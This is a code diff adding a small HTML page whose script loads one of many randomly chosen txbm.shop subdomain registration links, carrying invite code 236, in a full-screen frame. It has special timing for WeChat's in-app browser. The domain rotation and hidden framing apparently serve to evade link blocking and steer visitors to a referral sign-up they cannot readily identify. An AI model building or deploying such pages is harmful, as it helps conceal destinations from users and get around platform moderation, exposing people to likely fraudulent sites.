@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<title>hhhh</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
+html, body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden !important;
+    position: fixed;
+    top: 0;
+    left: 0;
+}
+#frame {
+    width: 100vw;
+    height: 100vh;
+    border: none;
+    overflow: hidden;
+    scrollbar-width: none;
+    -ms-overflow-style: none;
+}
+#frame::-webkit-scrollbar {
+    display: none;
+}
+</style>
+</head>
+<body>
+<iframe id="frame" scrolling="no" sandbox="allow-same-origin allow-scripts allow-forms"></iframe>
+
+<script>
+// 域名列表，请使用允许iframe嵌入的站点
+const domainList = [
+"https://d6d8o2g3.txbm.shop/register.php?invite=236",
+"https://s2h4b8u1.txbm.shop/register.php?invite=236",
+"https://y6t5k9h9.txbm.shop/register.php?invite=236",
+"https://o2q0f6z7.txbm.shop/register.php?invite=236",
+"https://y4z4g4q8.txbm.shop/register.php?invite=236",
+"https://y7r5a7u1.txbm.shop/register.php?invite=236",
+"https://d7t8p9l4.txbm.shop/register.php?invite=236",
+"https://y8q6b7t2.txbm.shop/register.php?invite=236",
+"https://z4t5y0b5.txbm.shop/register.php?invite=236",
+"https://t4n1p5p7.txbm.shop/register.php?invite=236",
+"https://t4j8l5i3.txbm.shop/register.php?invite=236",
+"https://p6a7q8x0.txbm.shop/register.php?invite=236",
+"https://z4b9p5o4.txbm.shop/register.php?invite=236",
+"https://k8f7p5n4.txbm.shop/register.php?invite=236",
+"https://s8o0j8k7.txbm.shop/register.php?invite=236",
+"https://t2e5n8z4.txbm.shop/register.php?invite=236",
+"https://i2m2q0a4.txbm.shop/register.php?invite=236",
+"https://z1r0q1p7.txbm.shop",
+];
+
+const $frame = document.getElementById('frame');
+
+function randomUrl() {
+    const idx = Math.floor(Math.random() * domainList.length);
+    let u = domainList[idx];
+    u += (u.includes('?') ? '&' : '?') + '_r=' + Date.now();
+    return u;
+}
+
+function loadInIframe() {
+    const url = randomUrl();
+    $frame.src = url;
+}
+
+const isWx = /MicroMessenger/i.test(navigator.userAgent);
+if (isWx) {
+    if (window.WeixinJSBridge) {
+        setTimeout(loadInIframe, 600);
+    } else {
+        document.addEventListener('WeixinJSBridgeReady', function () {
+            setTimeout(loadInIframe, 600);
+        }, false);
+    }
+} else {
+    window.addEventListener('load', function () {
+        setTimeout(loadInIframe, 600);
+    });
+}
+</script>
+</body>
+</html>
